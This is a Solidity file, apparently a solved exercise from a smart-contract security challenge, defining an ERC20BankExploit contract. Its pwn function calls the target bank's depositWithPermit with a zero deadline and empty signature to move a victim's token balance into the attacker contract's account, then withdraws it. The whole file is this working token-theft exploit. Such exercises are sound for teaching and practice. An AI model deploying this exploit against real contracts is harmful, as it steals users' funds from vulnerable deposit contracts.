// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "sce/sol/IERC20.sol";

interface IERC20Bank {
    function token() external view returns (address);
    function depositWithPermit(
        address owner,
        address recipient,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function withdraw(uint256 amount) external;
}

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn(address alice) external {
        // Write your code here
        address weth = IERC20Bank(target).token();
        uint256 amount = IERC20(weth).balanceOf(alice);
        IERC20Bank(target).depositWithPermit(alice, address(this), amount, 0, 0, "", "");
        IERC20Bank(target).withdraw(amount);
        
    }
}